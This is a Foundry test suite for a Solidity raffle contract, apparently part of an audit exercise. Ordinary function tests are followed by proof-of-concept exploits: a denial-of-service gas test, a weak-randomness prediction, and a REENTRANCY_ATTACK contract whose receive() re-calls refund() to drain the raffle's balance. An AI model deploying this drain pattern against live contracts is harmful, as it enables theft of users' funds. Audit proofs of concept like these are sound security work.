// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";


contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////
    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerTwo;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string
            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //////////////////////
    /// DOS ATTACK    ///
    /////////////////////

    function test_DOSAttack() public {
        vm.txGasPrice(1);
        uint initial = gasleft();

        uint playerNumber = 100;

        //initialize an array for first 100 players
        address[] memory DoS_array = new address[](playerNumber);
        for (uint160 i = 0; i < playerNumber; i++) {
            DoS_array[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playerNumber}(DoS_array);
        //how much gases consumed?
        uint256 gases = initial - gasleft();
        console.log(gases);

        //the gas is astronomically high for second 100 players

        address[] memory DoS_arraySecond = new address[](playerNumber);
        for (uint160 i = 0; i < playerNumber; i++) {
            DoS_array[i] = address(i + playerNumber);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playerNumber}(DoS_array);
        //how much gases consumed?
        uint256 gasesSecond = initial - gasleft();
        console.log(gasesSecond);
        assert(gases < gasesSecond);
    }

    function testCanEnterRaffleReentrancy() public {
        //legitimate participants of the PuppyRaffle
        address[] memory players = new address[](4);

        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        uint raffleBalance_beforeAttack = address(puppyRaffle).balance;

        //An attacker enters the raffle with the intention of stealing all funds
        //in the puppyRaffle contract

        REENTRANCY_ATTACK AttackContract = new REENTRANCY_ATTACK(puppyRaffle);
        // address prankin = address(Attack);
        address attacker = makeAddr("Attacker");

        vm.deal(attacker, 2 ether);

        vm.prank(attacker);
        AttackContract.lets_play{value: entranceFee}();

        //Sending payload-
        AttackContract.attack();

        //Raffle balance after successful attack
        uint raffleBalance_afterAttack = address(puppyRaffle).balance;

        //attack contract balance after attack
        uint attackBalance = address(AttackContract).balance;

        //PROOF
        console.log("raffle balance before attack", raffleBalance_beforeAttack);
        console.log("raffle balance after attack", raffleBalance_afterAttack);

        console.log("AttackContract balance after attack", attackBalance);
    }

    function testGetActivePlayerIndex() public {
        address[] memory play = new address[](3);
        play[0] = playerOne;
        play[1] = playerTwo;
        play[2] = playerThree;

        puppyRaffle.enterRaffle{value: entranceFee * play.length}(play);

        //an active address should return its index
        string memory activePlayer = puppyRaffle.getActivePlayerIndex(
            playerOne
        );
        console.log(activePlayer);

        //while an inactive address should return false value
        string memory inActive = puppyRaffle.getActivePlayerIndex(playerFour);
        console.log(inActive);
    }

    function test_exploitWeakRandomness() public {
        address maliciousMiner = makeAddr("miner");
        address[] memory players = new address[](5);

        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        players[4] = maliciousMiner;
        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
        //by simulating a predetermined block difficulty and timestamp we can prove
        //that a miner/validator can do that too
        vm.warp(1678989);
        //console.log(block.timestamp);
        vm.prevrandao(bytes32(uint(25)));
       // console.log(block.difficulty);
        uint winningIndexManipulated = uint256(
            keccak256(
                abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
            )
        ) % players.length;
         string memory maliciousMinerIndex = puppyRaffle.getActivePlayerIndex(
            maliciousMiner
        );
        address x= puppyRaffle.players(4);
        console.log(x, maliciousMiner,playerOne);
        assertEq(maliciousMinerIndex, Strings.toString(winningIndexManipulated));
    }
}

contract REENTRANCY_ATTACK {
    PuppyRaffle puppyRaffle;
    uint public playerIndex;
    uint public entranceFee;

    constructor(PuppyRaffle raffle) {
        puppyRaffle = raffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function lets_play() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        //playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
    }

    function attack() public {
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= 1 ether) {
            puppyRaffle.refund(playerIndex);
        }
    }

    fallback() external payable {}
}
